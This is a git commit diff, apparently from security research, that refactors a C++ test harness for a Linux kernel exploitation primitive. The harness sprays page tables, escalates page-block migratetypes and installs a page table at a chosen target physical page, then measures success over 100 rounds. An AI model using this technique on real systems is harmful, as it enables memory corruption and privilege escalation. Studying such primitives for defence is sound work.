b106399c2bbdc9573265c827fa0283d693a67f0d
biecho <dimeyer@ethz.ch>
2025-05-14 16:08:55 +0200

    Hello

--- src/test_mtype_escalate.cpp
+++ src/test_mtype_escalate.cpp
@@ -24,13 +24,49 @@ struct pt_install_ctxt {
     void* pt_mapped;
 };
 
+pt_install_ctxt hello(void* pageblock, void* target) {
+
+    auto pt_ctxt = pt_install_ctxt{};
+
+    const char* buf      = "ffffffffffffffff";
+    pt_ctxt.fd = open("/dev/shm", O_TMPFILE | O_RDWR, S_IRUSR | S_IWUSR);
+    write(pt_ctxt.fd, buf, 8);
+    pt_ctxt.fd_ptr = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
+                          MAP_SHARED | MAP_POPULATE, pt_ctxt.fd, 0);
+    mlock(pt_ctxt.fd_ptr, PAGE_SIZE);
+
+    unsigned long file_phys = rubench_va_to_pa(pt_ctxt.fd_ptr);
+
+    void* bait_ptr  = (void*)((unsigned long)pageblock + PAGEBLOCK_SIZE / 2);
+    auto spray_args = pt_spray_args_t{
+        .start = (void*)SPRAY_START,
+        .fd = pt_ctxt.fd,
+        .nr_tables = NR_PAGE_TABLES_SPRAY,
+    };
+
+    migratetype_escalation(bait_ptr, 9, pt_spray_bait_allocator,
+                           &spray_args);
+    pt_unspray_tables(spray_args);
+
+    // Move the target as next candidate for page table allocation
+    munlock(target, PAGE_SIZE);
+    block_merge(target, 0);
+    // Install the page table at the target.
+    pt_ctxt.pt_mapped = mmap(spray_args.start + PAGEBLOCK_SIZE, PAGE_SIZE,
+                             PROT_READ | PROT_WRITE,
+                             MAP_FIXED | MAP_SHARED | MAP_POPULATE,
+                             pt_ctxt.fd,
+                             0);
+
+    return pt_ctxt;
+}
+
 int main() {
     rubench_open();
 
     int num_rounds       = 100;
     long long total_time = 0;
     int num_fails        = 0;
-    const char* buf      = "ffffffffffffffff";
 
     for(int round = 0; round < num_rounds; round++) {
         printf("Round %d\n", round);
@@ -38,40 +74,12 @@ int main() {
         void* pageblock = get_page_block();
         void* target    = (void*)((unsigned long)pageblock + TARGET_OFFSET);
         mlock((void*)(unsigned long)target, PAGE_SIZE);
-
-        auto pt_ctxt = pt_install_ctxt{};
-
-        pt_ctxt.fd = open("/dev/shm", O_TMPFILE | O_RDWR, S_IRUSR | S_IWUSR);
-        write(pt_ctxt.fd, buf, 8);
-        pt_ctxt.fd_ptr = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
-                              MAP_SHARED | MAP_POPULATE, pt_ctxt.fd, 0);
-        mlock(pt_ctxt.fd_ptr, PAGE_SIZE);
-
-        unsigned long file_phys   = rubench_va_to_pa(pt_ctxt.fd_ptr);
         unsigned long target_phys = rubench_va_to_pa(target);
 
-        void* bait_ptr = (void*)((unsigned long)pageblock + PAGEBLOCK_SIZE / 2);
-        auto spray_args = pt_spray_args_t{
-            .start = (void*)SPRAY_START,
-            .fd = pt_ctxt.fd,
-            .nr_tables = NR_PAGE_TABLES_SPRAY,
-        };
-
-        migratetype_escalation(bait_ptr, 9, pt_spray_bait_allocator,
-                               &spray_args);
-        pt_unspray_tables(spray_args);
-
-        // Move the target as next candidate for page table allocation
-        munlock(target, PAGE_SIZE);
-        block_merge(target, 0);
-        // Install the page table at the target.
-        pt_ctxt.pt_mapped = mmap(spray_args.start + PAGEBLOCK_SIZE, PAGE_SIZE,
-                                 PROT_READ | PROT_WRITE,
-                                 MAP_FIXED | MAP_SHARED | MAP_POPULATE,
-                                 pt_ctxt.fd,
-                                 0);
+        auto pt_ctxt = hello(pageblock, target);
 
         unsigned long value = rubench_read_phys(target_phys);
+        auto file_phys = rubench_va_to_pa(pt_ctxt.fd_ptr);
 
         printf("Pageblock physical address: %lx\n", target_phys);
         printf("File physical address: %lx\n", file_phys);
